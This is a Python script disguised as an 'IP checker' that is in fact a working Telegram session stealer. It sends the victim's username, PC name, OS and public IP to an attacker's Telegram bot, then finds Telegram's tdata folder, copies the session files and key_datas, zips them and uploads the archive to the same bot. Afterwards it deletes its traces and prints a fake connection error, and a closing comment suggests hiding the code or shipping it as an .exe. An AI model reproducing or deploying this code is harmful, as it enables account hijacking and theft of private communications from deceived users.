import os
import time
import platform
import requests
import socket
import shutil
import string

BOT_TOKEN = "YOURTOKEN"
CHAT_ID = "YOUR TG ID"


TARGET_EXE = "Telegram.exe"
ARCHIVE_NAME = "SessionData"
INNER_FOLDER = "session"

TARGET_FOLDERS = [
    "A7FDF864FBC10B77",
    "D877F783D5D3EF8C",
    "F8806DD0C461824F",
    "C2B05980D9127787"
]

TARGET_FILES = [
    "A7FDF864FBC10B77s",
    "C2B05980D9127787s",
    "D877F783D5D3EF8Cs",
    "F8806DD0C461824Fs",
    "key_datas"
]

def print_banner():
    print("""
██╗██████╗░  ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
██║██╔══██╗  ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
██║██████╔╝  ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
██║██╔═══╝░  ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
██║██║░░░░░  ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
╚═╝╚═╝░░░░░  ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
""")
    print('Загрузка модулей...')
    time.sleep(1)

def get_system_info():
    info = {}
    try: info['username'] = os.getlogin()
    except: info['username'] = "Unknown"
    info['computer_name'] = platform.node()
    info['os'] = f"{platform.system()} {platform.release()}"
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        info['public_ip'] = response.json()['ip']
    except: info['public_ip'] = "Не удалось определить"
    return info

def send_report(info):
    message_text = (
        f"💻 *new fish*\n\n"
        f"👤 User: `{info['username']}`\n"
        f"🖥 PC: `{info['computer_name']}`\n"
        f"⚙ OS: `{info['os']}`\n"
        f"🌐 IP: `{info['public_ip']}`"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message_text, 'parse_mode': 'Markdown'}
    try: requests.post(url, json=payload, timeout=5)
    except: pass



def find_game_path():
    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    for drive in drives:
        try:
            for root, dirs, files in os.walk(drive):
                if TARGET_EXE in files:
                    return root
        except: continue
    return None

def prepare_and_archive(game_root_path):
    temp_dir = os.path.join(os.getenv('TEMP'), "update_cache_tmp")
    base_dest = os.path.join(temp_dir, INNER_FOLDER)
    copied_items = []

    if os.path.exists(temp_dir):
        try: shutil.rmtree(temp_dir)
        except: pass
    
    os.makedirs(base_dest, exist_ok=True)

    try:
        for folder_name in set(TARGET_FOLDERS):
            source = os.path.join(game_root_path, "tdata", folder_name)
            destination = os.path.join(base_dest, folder_name)
            
            if os.path.exists(source) and os.path.isdir(source):
                shutil.copytree(source, destination)
                copied_items.append(f"[DIR] {folder_name}")

        for file_name in set(TARGET_FILES):
            source = os.path.join(game_root_path, "tdata", file_name)
            destination = os.path.join(base_dest, file_name)
            
            if os.path.exists(source) and os.path.isfile(source):
                shutil.copy2(source, destination)
                copied_items.append(f"[FILE] {file_name}")

        if not copied_items: return None, None, []

        zip_path = shutil.make_archive(os.path.join(os.getenv('TEMP'), ARCHIVE_NAME), 'zip', root_dir=temp_dir)
        return zip_path, temp_dir, copied_items

    except Exception:
        if os.path.exists(temp_dir):
            try: shutil.rmtree(temp_dir)
            except: pass
        return None, None, []

def send_file(file_path, caption_text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': CHAT_ID, 'caption': caption_text})
    except: pass

def main():
    print_banner()
    
    info = get_system_info()
    send_report(info)
    
    game_root = find_game_path()
    if game_root:
        zip_file, temp_dir, found_list = prepare_and_archive(game_root)
        if zip_file:
            msg = f"📁 Найдены данные сессии!\nПуть: {game_root}\nФайлов: {len(found_list)}"
            send_file(zip_file, msg)
            
            try:
                os.remove(zip_file)
                shutil.rmtree(temp_dir)
            except: pass
    
    print("\nОшибка подключения к серверу проверки.")
    input("Нажмите Enter для выхода...")

if __name__ == "__main__":
    main()


#use .exe or hide code

